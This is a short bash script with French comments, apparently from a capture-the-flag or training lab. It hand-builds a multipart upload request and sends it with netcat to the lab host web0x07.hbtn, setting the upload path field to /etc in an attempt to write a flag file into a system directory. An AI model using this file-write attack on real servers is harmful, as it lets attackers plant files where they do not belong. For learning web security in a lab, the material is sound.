#!/bin/bash
# Script pour uploader avec netcat et voir la réponse brute

BOUNDARY="----WebKitFormBoundary7MA4YWxkTrZu0gW"

# Créer la requête HTTP complète
cat > /tmp/upload_request.txt << EOF
POST /task0/upload_file HTTP/1.1
Host: web0x07.hbtn
Content-Type: multipart/form-data; boundary=${BOUNDARY}
Content-Length: 285

${BOUNDARY}
Content-Disposition: form-data; name="path"

/etc
${BOUNDARY}
Content-Disposition: form-data; name="file"; filename="0-flag.txt"
Content-Type: text/plain

test content
${BOUNDARY}--
EOF

# Envoyer avec netcat
cat /tmp/upload_request.txt | nc web0x07.hbtn 80

# Nettoyer
rm /tmp/upload_request.txt
